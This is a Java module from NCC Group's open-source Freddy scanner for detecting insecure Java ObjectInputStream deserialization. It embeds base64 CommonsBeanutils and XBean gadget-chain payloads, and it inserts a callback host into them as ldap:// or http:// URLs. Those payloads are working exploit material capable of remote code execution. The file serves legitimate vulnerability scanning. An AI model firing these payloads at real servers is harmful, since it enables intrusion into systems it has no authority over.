// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java ObjectInputStream API.
 * 
 * Note: All of the ysoserial payloads are valid here along
 *       with the modified payloads used by BaRMIe that
 *       support more versions of the relevant libraries
 *       however these payloads have not yet been
 *       implemented here.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class ObjectInputStreamModule extends FreddyModuleBase {
	//CommonsBeanutils payload data
	private static final int COMBU_PAYLOAD_CMD_OFFSET = 1033;
	private static final String COMBU_PREFIX_B64 = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAnamF2YS51dGlsLkNvbGxlY3Rpb25zJFJldmVyc2VDb21wYXJhdG9yZASK8FNOStACAAB4cHQAEGRhdGFiYXNlTWV0YURhdGF3BAAAAANzcgAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGzOJtgfSXPCBQIAB0wABGNvbm50ABVMamF2YS9zcWwvQ29ubmVjdGlvbjtMAA1pTWF0Y2hDb2x1bW5zdAASTGphdmEvdXRpbC9WZWN0b3I7TAACcHN0ABxMamF2YS9zcWwvUHJlcGFyZWRTdGF0ZW1lbnQ7TAAFcmVzTUR0ABxMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7TAAGcm93c01EdAAlTGphdmF4L3NxbC9yb3dzZXQvUm93U2V0TWV0YURhdGFJbXBsO0wAAnJzdAAUTGphdmEvc3FsL1Jlc3VsdFNldDtMAA9zdHJNYXRjaENvbHVtbnNxAH4AC3hyABtqYXZheC5zcWwucm93c2V0LkJhc2VSb3dTZXRD0R2lTcKx4AIAFUkAC2NvbmN1cnJlbmN5WgAQZXNjYXBlUHJvY2Vzc2luZ0kACGZldGNoRGlySQAJZmV0Y2hTaXplSQAJaXNvbGF0aW9uSQAMbWF4RmllbGRTaXplSQAHbWF4Um93c0kADHF1ZXJ5VGltZW91dFoACHJlYWRPbmx5SQAKcm93U2V0VHlwZVoAC3Nob3dEZWxldGVkTAADVVJMcQB+AARMAAthc2NpaVN0cmVhbXQAFUxqYXZhL2lvL0lucHV0U3RyZWFtO0wADGJpbmFyeVN0cmVhbXEAfgARTAAKY2hhclN0cmVhbXQAEExqYXZhL2lvL1JlYWRlcjtMAAdjb21tYW5kcQB+AARMAApkYXRhU291cmNlcQB+AARMAAlsaXN0ZW5lcnNxAH4AC0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO0wABnBhcmFtc3QAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wADXVuaWNvZGVTdHJlYW1xAH4AEXhwAAAD8AEAAAPoAAAAAAAAAAIAAAAAAAAAAAAAAAABAAAD7ABwcHBwcHQAyA==";
	private static final String COMBU_SUFFIX_B64 = "cHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAACnVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhw/////3EAfgAgcQB+ACBxAH4AIHEAfgAgcQB+ACBxAH4AIHEAfgAgcQB+ACBxAH4AIHhwcHBwc3EAfgAZAAAAAAAAAAp1cQB+ABwAAAAKdAADZm9vcHBwcHBwcHBweHEAfgAVeA==";
	private byte[] COMBU_PAYLOAD;
	
	//XBean payload data
	private static final int XBEAN_PAYLOAD_CMD_OFFSET = 798;
	private static final String XBEAN_PREFIX_B64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAN29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5Ib3RTd2FwcGFibGVUYXJnZXRTb3VyY2VoDf7kp0GjUwIAAUwABnRhcmdldHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAO29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuQ29udGV4dFV0aWwkUmVhZE9ubHlCaW5kaW5nRWd70KwaKnYCAANaAAppc1JlbGF0aXZlTAAHY29udGV4dHQAFkxqYXZheC9uYW1pbmcvQ29udGV4dDtMAAV2YWx1ZXEAfgADeHIAFGphdmF4Lm5hbWluZy5CaW5kaW5neqs1y7XxLwICAAFMAAhib3VuZE9ianEAfgADeHIAGmphdmF4Lm5hbWluZy5OYW1lQ2xhc3NQYWlyTgECi/p2aGsCAARaAAVpc1JlbEwACWNsYXNzTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACGZ1bGxOYW1lcQB+AAlMAARuYW1lcQB+AAl4cAFwcHQAA2Zvb3NyABZqYXZheC5uYW1pbmcuUmVmZXJlbmNl6MaeoqjpjQkCAARMAAVhZGRyc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wADGNsYXNzRmFjdG9yeXEAfgAJTAAUY2xhc3NGYWN0b3J5TG9jYXRpb25xAH4ACUwACWNsYXNzTmFtZXEAfgAJeHBzcgAQamF2YS51dGlsLlZlY3RvctmXfVuAO68BAwADSQARY2FwYWNpdHlJbmNyZW1lbnRJAAxlbGVtZW50Q291bnRbAAtlbGVtZW50RGF0YXQAE1tMamF2YS9sYW5nL09iamVjdDt4cAAAAAAAAAAAdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAACnBwcHBwcHBwcHB4dAAGRnJlZGR5dADI";
	private static final String XBEAN_SUFFIX_B64 = "cQB+AAsAc3IAL29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuV3JpdGFibGVDb250ZXh0WfEdulF1NAUCAAdaABZhc3N1bWVEZXJlZmVyZW5jZUJvdW5kWgAPY2FjaGVSZWZlcmVuY2VzWgAZY2hlY2tEZXJlZmVyZW5jZURpZmZlcmVudFoAFHN1cHBvcnRSZWZlcmVuY2VhYmxlTAALYmluZGluZ3NSZWZ0AC1MamF2YS91dGlsL2NvbmN1cnJlbnQvYXRvbWljL0F0b21pY1JlZmVyZW5jZTtMAAhpbmRleFJlZnEAfgAXTAAJd3JpdGVMb2NrdAAhTGphdmEvdXRpbC9jb25jdXJyZW50L2xvY2tzL0xvY2s7eHIAOG9yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuQWJzdHJhY3RGZWRlcmF0ZWRDb250ZXh03enVmyx5U0QCAAJMABFjb250ZXh0RmVkZXJhdGlvbnQAM0xvcmcvYXBhY2hlL3hiZWFuL25hbWluZy9jb250ZXh0L0NvbnRleHRGZWRlcmF0aW9uO0wADW1hc3RlckNvbnRleHR0ADpMb3JnL2FwYWNoZS94YmVhbi9uYW1pbmcvY29udGV4dC9BYnN0cmFjdEZlZGVyYXRlZENvbnRleHQ7eHIAL29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuQWJzdHJhY3RDb250ZXh0WfRmdypyTGsCAAVaAAptb2RpZmlhYmxlTAANY29udGV4dEFjY2Vzc3QAL0xvcmcvYXBhY2hlL3hiZWFuL25hbWluZy9jb250ZXh0L0NvbnRleHRBY2Nlc3M7TAAGaW5DYWxsdAAXTGphdmEvbGFuZy9UaHJlYWRMb2NhbDtMAA9uYW1lSW5OYW1lc3BhY2VxAH4ACUwAFXBhcnNlZE5hbWVJbk5hbWVzcGFjZXQAE0xqYXZheC9uYW1pbmcvTmFtZTt4cABwcHBwcHAAAAAAcHBwcQB+AA5xAH4ABHNxAH4AAnNyADFjb20uc3VuLm9yZy5hcGFjaGUueHBhdGguaW50ZXJuYWwub2JqZWN0cy5YU3RyaW5nHAonO0gWxf0CAAB4cgAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWE9iamVjdPSYEgm7e7YZAgABTAAFbV9vYmpxAH4AA3hyACxjb20uc3VuLm9yZy5hcGFjaGUueHBhdGguaW50ZXJuYWwuRXhwcmVzc2lvbgfZphyNrKzWAgABTAAIbV9wYXJlbnR0ADJMY29tL3N1bi9vcmcvYXBhY2hlL3hwYXRoL2ludGVybmFsL0V4cHJlc3Npb25Ob2RlO3hwcHQABuGrvAEEA3EAfgAheA==";
	private byte[] XBEAN_PAYLOAD;
	
	protected void initialiseModule() {
		setName("ObjectInputStream");
		setPlatform(TargetPlatform.JAVA);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		//Initialise payload buffers
		COMBU_PAYLOAD = buildBinaryPayloadBuffer(COMBU_PREFIX_B64, COMBU_SUFFIX_B64, false);
		XBEAN_PAYLOAD = buildBinaryPayloadBuffer(XBEAN_PREFIX_B64, XBEAN_SUFFIX_B64, false);
		
		//Register passive/active scan payloads
		registerPassiveScanIndicator(new byte[] {(byte)0xac, (byte)0xed, 0x00}, IndicatorTarget.REQUEST);
		registerPassiveScanIndicator("java.io.StreamCorruptedException", IndicatorTarget.RESPONSE);
		
		registerActiveScanExceptionPayload(new byte[] {0x00, 0x00, 0x00, 0x00}, "invalid stream header: 00000000");
		
		registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, true);
		registerActiveScanCollaboratorPayload(PN_XBEAN, true);
	}
	
	protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_COMBEANUTILS:
				return generateBinaryPayload(COMBU_PAYLOAD, COMBU_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
			
			case PN_XBEAN:
				return generateBinaryPayload(XBEAN_PAYLOAD, XBEAN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);
		}
		return null;
	}
}
